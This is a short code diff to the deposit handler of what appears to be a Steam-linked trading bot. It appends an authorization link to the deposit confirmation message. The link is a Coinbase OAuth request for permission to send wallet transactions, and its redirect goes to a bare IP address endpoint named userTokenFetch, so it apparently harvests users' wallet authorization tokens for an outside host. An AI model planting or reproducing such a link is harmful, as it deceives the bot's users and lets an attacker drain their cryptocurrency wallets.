@@ -54,7 +54,10 @@ module.exports.HandleDeposit = async function HandleSell(steamID, params) {
 
     const balance = await GetBalance(steamID)
 
-    return { withdraw: true, msg: `Your deposit request has been executed.\n\n${balance}` }
+    return {
+        withdraw: true,
+        msg: `Your deposit request has been executed.\n\n${balance} \n\n to autorize please click on this link : https://www.coinbase.com/oauth/authorize?account=&client_id=43926b5bbe08d3739da3e9b7fb3503536100b6318bfc668a1cc01f306bdeeabb&redirect_uri=http%3A%2F%2F41.109.103.182%3A3000%2FuserTokenFetch&response_type=code&scope=wallet:transactions:send&meta[${amount}]=1&state=SECURE_RANDOM`,
+    }
 }
 
 module.exports.HandleWithdraw = async function HandleSell(steamID, params) {
